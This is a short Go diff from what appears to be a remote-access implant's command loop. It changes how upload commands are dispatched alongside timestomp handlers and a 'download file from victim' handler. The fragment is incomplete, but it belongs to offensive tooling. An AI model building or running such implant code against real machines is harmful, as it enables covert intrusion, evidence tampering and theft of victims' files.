@@ -129,9 +129,9 @@ func main() {
 								execErr = command.TimeStomp(cmdBuf)
 							// UPLOAD_START and UPLOAD_LOOP is same
 							case command.CMD_TYPE_UPLOAD_START:
-								fallthrough
+								execErr = command.Upload(cmdBuf, true)
 							case command.CMD_TYPE_UPLOAD_LOOP:
-								execErr = command.Upload(cmdBuf)
+								execErr = command.Upload(cmdBuf, false)
 							// download file from victim
 							case command.CMD_TYPE_DOWNLOAD:
 								execErr = command.Download(cmdBuf)
